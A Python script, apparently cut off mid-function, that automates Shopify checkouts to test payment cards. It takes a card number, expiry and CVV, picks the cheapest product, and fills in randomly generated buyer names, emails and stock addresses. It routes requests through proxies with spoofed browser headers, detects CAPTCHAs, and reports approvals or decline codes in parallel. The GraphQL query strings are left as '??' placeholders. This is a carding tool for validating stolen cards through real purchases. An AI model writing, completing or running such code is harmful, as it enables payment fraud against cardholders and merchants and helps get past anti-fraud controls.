import asyncio
import aiohttp
import json
import os
import re
import random
import argparse
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import time
from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeoutError
import threading
import logging
import atexit
import signal

# ═══════════════════════════════════════════
# CONFIGURATION (env vars support)
# ═══════════════════════════════════════════
PARALLEL_WORKERS = int(os.environ.get("PARALLEL_WORKERS", 20))   # ✅ FIXED: 10 → 20
PARALLEL_TIMEOUT = int(os.environ.get("PARALLEL_TIMEOUT", 120))  # ✅ FIXED: 60 → 120

# Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# Thread pool + counters
_executor = ThreadPoolExecutor(max_workers=PARALLEL_WORKERS)
_active_requests = 0
_request_lock = threading.Lock()


def _shutdown():
    logger.info("Shutting down thread pool...")
    _executor.shutdown(wait=True)
    logger.info("Thread pool shutdown complete.")


atexit.register(_shutdown)
signal.signal(signal.SIGTERM, lambda signum, frame: _shutdown())
signal.signal(signal.SIGINT, lambda signum, frame: _shutdown())


def run_card_check_parallel(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(
            process_card_async(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
        )
    finally:
        loop.close()


# ═══════════════════════════════════════════
# PLACEHOLDER: Paste real queries below
# ═══════════════════════════════════════════
QUERY_PROPOSAL_SHIPPING = """??"""

QUERY_PROPOSAL_DELIVERY = """??"""

MUTATION_SUBMIT = """??"""

QUERY_POLL = """??"""


C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}


def pick_addr(url, cc=None, rc=None):
    """Pick address by: domain TLD → currency-to-country → rc → DEFAULT."""
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc.lower()

    for country_code, addr in book.items():
        if country_code == "DEFAULT":
            continue
        if dom.endswith("." + country_code.lower()):
            return addr

    tld = dom.split(".")[-1].upper()
    tld_map = {"UK": "GB"}
    country_from_tld = tld_map.get(tld, tld)
    if country_from_tld in book and country_from_tld != "DEFAULT":
        return book[country_from_tld]

    ccn = C2C.get(cc)
    if ccn and ccn in book:
        return book[ccn]

    if rc in book:
        return book[rc]

    return book["DEFAULT"]


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result != "" else None
        return None
    except Exception:
        return None


class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))

    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(":")
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        return None


def is_captcha_required(response_text):
    if not response_text:
        return False

    try:
        resp_json = json.loads(response_text)
        errors = resp_json.get("errors", [])
        for error in errors:
            code = str(error.get("code", "")).upper()
            msg = str(error.get("message", "")).upper()
            if "CAPTCHA" in code or "CAPTCHA" in msg:
                return True
    except (json.JSONDecodeError, Exception):
        pass

    indicators = [
        "CAPTCHA_REQUIRED",
        '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"',
        "captcha required",
        "CAPTCHA CHALLENGE",
        "hcaptcha",
        "h-captcha",
    ]
    text_upper = response_text.upper()
    for indicator in indicators:
        if indicator.upper() in text_upper:
            return True
    return False


async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=1
):
    for attempt in range(max_retries + 1):
        try:
            response = await session.post(
                graphql_url, params=params, headers=headers, json=json_data
            )
            response_text = await response.text()
            return response, response_text, False
        except Exception as e:
            logger.warning("GraphQL request attempt %d failed: %s", attempt + 1, str(e))
            if attempt == max_retries:
                return None, str(e), False
            await asyncio.sleep(1)


async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith("http"):
            domain = "https://" + domain

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)

        proxy = parse_proxy(proxy_str) if proxy_str else None

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
                if resp.status != 200:
                    return False, f"<b>Site Error! Status: {resp.status}</b>"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "<b>Not Shopify!</b>"

                result = (await resp.json())["products"]
                if not result:
                    return False, "<b>No Products!</b>"

        min_price = float("inf")
        min_product = None

        for product in result:
            if not product.get("variants"):
                continue

            for variant in product["variants"]:
                if not variant.get("available", True):
                    continue

                try:
                    price = variant.get("price", "0")
                    if isinstance(price, str):
                        price = float(price.replace(",", ""))
                    else:
                        price = float(price)

                    if price < min_price:
                        min_price = price
                        min_product = {
                            "site": domain,
                            "price": f"{price:.2f}",
                            "variant_id": str(variant["id"]),
                            "link": f"{domain}/products/{product['handle']}",
                        }
                except (ValueError, TypeError, AttributeError):
                    continue

        if isinstance(min_product, dict) and min_product.get("variant_id"):
            return min_product
        else:
            return False, "<b>No Valid Products</b>"

    except aiohttp.ClientError as e:
        msg = str(e) if str(e) else type(e).__name__
        return False, f"<b>Proxy Error: {msg}</b>"
    except asyncio.TimeoutError:
        return False, "<b>Timeout</b>"
    except Exception as e:
        msg = str(e) if str(e) else type(e).__name__
        return False, f"error: {msg}"


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"

    message = str(message)

    patterns = [
        r"(PAYMENTS_[A-Z_]+)",
        r"(CARD_[A-Z_]+)",
        r"([A-Z]+_[A-Z]+_[A-Z_]+)",
        r"([A-Z]+_[A-Z_]+)",
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'",
    ]

    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match

    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word

    return message[:50]


# ═══════════════════════════════════════════
# process_card  —  Part 1 (setup → vault)
# ═══════════════════════════════════════════

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    displayName = ""
    payment_identifier = None
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": ourl,
            "Referer": ourl,
            "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }

        # ✅ FIXED: cc ကို currency ပြောင်းပေးခဲ့ (နောက်မှ update လုပ်မယ်)
        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]

        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)

        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""

        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, total_price, currency
            variant_id = info["variant_id"]

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = ourl
            cart = url + "/cart/add.js"
            checkout = url + "/checkout/"

            # ── Add to cart ──
            cart_headers = {
                **headers,
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json, text/javascript",
            }
            cart_resp = await session.post(
                cart, data=f"id={variant_id}&quantity=1", headers=cart_headers, proxy=proxy
            )

            if cart_resp.status != 200:
                cart_headers_alt = {
                    **headers,
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                }
                cart_data = {"items": [{"id": int(variant_id), "quantity": 1}]}
                cart_resp = await session.post(
                    cart, json=cart_data, headers=cart_headers_alt, proxy=proxy
                )

            if cart_resp.status != 200:
                return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency

            # ── Go to checkout ──
            checkout_headers = {
                **headers,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
            }
            response = await session.post(
                url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy
            )
            checkout_url = str(response.url)

            attempt_token_match = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
            attempt_token = (
                attempt_token_match.group(1)
                if attempt_token_match
                else checkout_url.split("/")[-1].split("?")[0]
            )

            sst = response.headers.get("X-Checkout-One-Session-Token") or response.headers.get(
                "x-checkout-one-session-token"
            )

            text = await response.text()
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', "&quot;")
                if not sst:
                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                if not sst:
                    sst = extract_between(text, '"serializedSessionToken":"', '"')
                if not sst:
                    sst = extract_between(text, 'data-session-token="', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')

            if "login" in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency

            queueToken = extract_between(
                text, "queueToken&quot;:&quot;", "&quot;"
            ) or extract_between(text, '"queueToken":"', '"')
            stableId = extract_between(
                text, "stableId&quot;:&quot;", "&quot;"
            ) or extract_between(text, '"stableId":"', '"')

            merch = (
                extract_between(text, "ProductVariantMerchandise/", "&quot;")
                or extract_between(text, "ProductVariantMerchandise/", "&q")
                or extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            )
            if not merch:
                merch = str(variant_id)

            currency = "USD"
            if "currencyCode&quot;:&quot;" in text:
                currency = extract_between(text, "currencyCode&quot;:&quot;", "&quot;") or "USD"
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or "USD"

            subtotal = extract_between(
                text, "subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;", "&quot;"
            ) or extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            unescaped_text = text.replace("&quot;", '"').replace("&amp;", "&").replace("&#39;", "'")

            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
            if build_match:
                build_id = build_match.group(1)

            source_token = extract_between(unescaped_text, 'name="serialized-sourceToken" content="', '"')
            if not source_token:
                source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
                if source_token:
                    source_token = source_token.replace("&quot;", "").strip('"')

            ident_sig = None
            ident_match = re.search(
                r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text
            )
            if ident_match:
                ident_sig = ident_match.group(1)

            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency

            headers.update({
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            })
            if build_id:
                headers["x-checkout-web-build-id"] = build_id
                headers["x-checkout-web-deploy-stage"] = "production"
                headers["x-checkout-web-server-handling"] = "fast"
                headers["x-checkout-web-server-rendering"] = "yes"
            if source_token:
                headers["x-checkout-web-source-id"] = source_token

            params = {"operationName": "Proposal"}

            # ✅ FIXED: currency ပြီးမှ address update
            address_info = pick_addr(ourl, cc=currency)
            country_code = address_info["countryCode"]
            phone = address_info["phone"]
            street = address_info["address1"]
            city = address_info["city"]
            state = address_info["zoneCode"]
            s_zip = address_info["postalCode"]

            json_data = {
                "query": QUERY_PROPOSAL_SHIPPING,
                "variables": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": street, "address2": address2,
                                    "city": city, "countryCode": country_code,
                                    "postalCode": s_zip, "firstName": firstName,
                                    "lastName": lastName, "zoneCode": state,
                                    "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {
                                "value": {"amount": subtotal, "currencyCode": currency}
                            },
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": "", "city": "",
                                "countryCode": country_code,
                                "lastName": "", "zoneCode": "ENG", "phone": "",
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email,
                        "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {
                            "value": {"amount": "0", "currencyCode": currency}
                        },
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None,
                        "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": "Proposal",
            }

            graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"

            # ── 1st proposal: warm up shipping rates ──
            for i in range(2):
                response, resp_text, _ = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
                )
                if i == 0:
                    if not response:
                        logger.warning("Warmup proposal failed, continuing...")
                    await asyncio.sleep(1)   # ✅ FIXED: sleep(3) → sleep(1)

            if not response:
                return False, f"Request failed: {resp_text}", gateway, total_price, currency

            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency

            if "errors" in resp_json:
                errors = resp_json.get("errors", [])
                error_msgs = [e.get("message", str(e)) for e in errors[:3]]
                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

            try:
                if "data" not in resp_json:
                    return False, "No data in proposal response", gateway, total_price, currency

                session_data = resp_json["data"].get("session")
                if session_data is None:
                    return False, "Session is null", gateway, total_price, currency

                negotiate = session_data.get("negotiate")
                if negotiate is None:
                    return False, "Negotiate returned null", gateway, total_price, currency

                result = negotiate.get("result")
                if result is None:
                    return False, "Result is null", gateway, total_price, currency

                result_type = result.get("__typename", "Unknown")

                if result_type == "CheckpointDenied":
                    return False, "Checkpoint Denied", gateway, total_price, currency
                if result_type == "Throttled":
                    return False, "Throttled", gateway, total_price, currency
                if result_type == "NegotiationResultFailed":
                    return False, "Negotiation failed", gateway, total_price, currency

                checkpoint_data = result.get("checkpointData")
                seller_proposal = result.get("sellerProposal")
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, total_price, currency

                delivery_data = seller_proposal.get("delivery")
                running_total_data = seller_proposal.get("runningTotal")

                if not running_total_data:
                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency

                running_total = running_total_data["value"]["amount"]

            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency

            delivery_type = delivery_data.get("__typename", "")

            if delivery_type == "PendingTerms":
                delivery_strategy = ""
                shipping_amount = 0.0
            elif delivery_type == "FilledDeliveryTerms":
                delivery_lines = delivery_data.get("deliveryLines", [{}])
                if delivery_lines and len(delivery_lines) > 0:
                    available_strategies = delivery_lines[0].get("availableDeliveryStrategies", [])
                    if available_strategies and len(available_strategies) > 0:
                        delivery_strategy = available_strategies[0].get("handle", "")
                        shipping_amount_data = (
                            available_strategies[0].get("amount", {}).get("value", {}).get("amount", "0")
                        )
                        try:
                            shipping_amount = float(shipping_amount_data)
                        except (ValueError, TypeError):
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ""
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ""
                    shipping_amount = 0.0
            else:
                delivery_strategy = ""
                shipping_amount = 0.0

            try:
                tax_data = seller_proposal.get("tax", {})
                if tax_data and tax_data.get("__typename") == "FilledTaxTerms":
                    tax_amount_data = (
                        tax_data.get("totalTaxAmount", {}).get("value", {}).get("amount", "0")
                    )
                    tax_amount = float(tax_amount_data)
                else:
                    tax_amount = 0.0
            except (ValueError, TypeError):
                tax_amount = 0.0

            payment_data = seller_proposal.get("payment", {})
            if payment_data and payment_data.get("__typename") == "FilledPaymentTerms":
                payment_methods = payment_data.get("availablePaymentLines", [])
                for method in payment_methods:
                    payment_method = method.get("paymentMethod", {})
                    if payment_method.get("name") or payment_method.get("paymentMethodIdentifier"):
                        payment_identifier = payment_method.get("paymentMethodIdentifier")
                        displayName = payment_method.get("extensibilityDisplayName") or payment_method.get("name", "Unknown")
                        gateway = payment_method.get("extensibilityDisplayName") or payment_method.get("name", "UNKNOWN")
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break

            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency

            # ── 2nd proposal: with delivery ──
            json_data["query"] = QUERY_PROPOSAL_DELIVERY
            json_data["variables"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                "deliveryStrategyByHandle": {
                    "handle": delivery_strategy if delivery_strategy else "",
                    "customDeliveryRate": False,
                },
                "options": {},
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["targetMerchandiseLines"] = {
                "lines": [{"stableId": stableId or "1"}]
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {
                "value": {"amount": str(shipping_amount), "currencyCode": currency}
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["destinationChanged"] = False
            json_data["variables"]["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": address2,
                    "city": city, "countryCode": country_code,
                    "postalCode": s_zip, "firstName": firstName,
                    "lastName": lastName, "zoneCode": state,
                    "phone": phone,
                }
            }
            json_data["variables"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)
            json_data["variables"]["buyerIdentity"]["shopPayOptInPhone"]["number"] = phone

            response, resp_text, _ = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
            )

            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency

            # ✅ FIXED: delivery response check ထည့်ခဲ့
            if not response:
                return False, "Delivery proposal request failed", gateway, total_price, currency

            try:
                delivery_resp = json.loads(resp_text)
                delivery_errors = delivery_resp.get("errors", [])
                if delivery_errors:
                    err_msgs = [e.get("message", str(e)) for e in delivery_errors[:2]]
                    logger.warning("Delivery proposal errors: %s", err_msgs)
            except json.JSONDecodeError:
                logger.warning("Delivery proposal returned invalid JSON")

            # ── Vault card ──
            vault_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "Referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
                "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-fetch-storage-access": "active",
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": "",
                    "start_year": "",
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(ourl).netloc
            }

            response = await session.post(
                "https://checkout.pci.shopifyinc.com/sessions",
                json=payload, headers=vault_headers, proxy=proxy
            )
            try:
                token_data = await response.json()
                token = token_data.get("id")
                if not token:
                    return False, "Unable to get payment token", gateway, total_price, currency
            except Exception as e:
                return False, f"Unable to get payment token: {str(e)}", gateway, total_price, currency

            # ═══════════════════════════════════════════
            # SUBMIT FOR COMPLETION
            # ═══════════════════════════════════════════

            params = {"operationName": "SubmitForCompletion"}

            submit_variables = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": street, "address2": address2,
                                    "city": city, "countryCode": country_code,
                                    "postalCode": s_zip, "firstName": firstName,
                                    "lastName": lastName, "zoneCode": state,
                                    "phone": phone
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {
                                    "handle": delivery_strategy if delivery_strategy else "",
                                    "customDeliveryRate": False
                                },
                                "options": {"phone": phone}
                            },
                            "targetMerchandiseLines": {
                                "lines": [{"stableId": stableId or "1"}]
                            },
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {
                                "value": {"amount": str(shipping_amount), "currencyCode": currency}
                            },
                            "destinationChanged": False
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": True,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {
                                "value": {"amount": subtotal, "currencyCode": currency}
                            },
                            "lineComponentsSource": None,
                            "lineComponents": []
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": payment_identifier,
                                    "sessionId": token,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": street, "address2": address2,
                                            "city": city, "countryCode": country_code,
                                            "postalCode": s_zip, "firstName": firstName,
                                            "lastName": lastName, "zoneCode": state,
                                            "phone": phone
                                        }
                                    },
                                    "cardSource": None
                                }
                            },
                            "amount": {
                                "value": {"amount": running_total, "currencyCode": currency}
                            },
                            "dueAt": None
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": street, "address2": address2,
                                "city": city, "countryCode": country_code,
                                "postalCode": s_zip, "firstName": firstName,
                                "lastName": lastName, "zoneCode": state,
                                "phone": phone
                            }
                        }
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email,
                        "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                        "rememberMe": False
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {
                            "value": {"amount": str(tax_amount), "currencyCode": currency}
                        },
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": []
                    },
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False}
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {"requestUrl": checkout_url}
            }

            if checkpoint_data:
                submit_variables["input"]["checkpointData"] = checkpoint_data

            submit_json_data = {
                "query": MUTATION_SUBMIT,
                "variables": submit_variables,
                "operationName": "SubmitForCompletion"
            }

            response, text, _ = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
            )

            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency

            try:
                resp_json = json.loads(text)
            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit: {text[:100]}", gateway, total_price, currency

            errors_list = resp_json.get("errors", [])
            for error in errors_list:
                msg = str(error.get("message", "")).lower()
                if "order total has changed" in msg:
                    return False, "Site not supported", gateway, total_price, currency
                if "payment method is not available" in msg:
                    return False, "Payment method not available", gateway, total_price, currency

            submit_data = resp_json.get("data", {}).get("submitForCompletion", {})

            if not submit_data:
                if errors_list:
                    for error in errors_list:
                        code = error.get("code")
                        if code:
                            return False, code, gateway, total_price, currency
                return False, "Empty submit response", gateway, total_price, currency

            result_type = submit_data.get("__typename", "")

            if result_type in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = submit_data.get("receipt", {})
                if receipt:
                    receipt_type = receipt.get("__typename", "")
                    if receipt_type == "ProcessedReceipt":
                        return True, "ORDER_PLACED", gateway, total_price, currency
                    rid = receipt.get("id")
                else:
                    return False, "SubmitSuccess but no receipt", gateway, total_price, currency

            elif result_type == "SubmitFailed":
                reason = submit_data.get("reason", "Unknown reason")
                return False, extract_clean_response(reason), gateway, total_price, currency

            elif result_type == "SubmitRejected":
                errors = submit_data.get("errors", [])
                if errors:
                    for error in errors:
                        code = error.get("code", "")
                        localized_msg = error.get("localizedMessage", "")
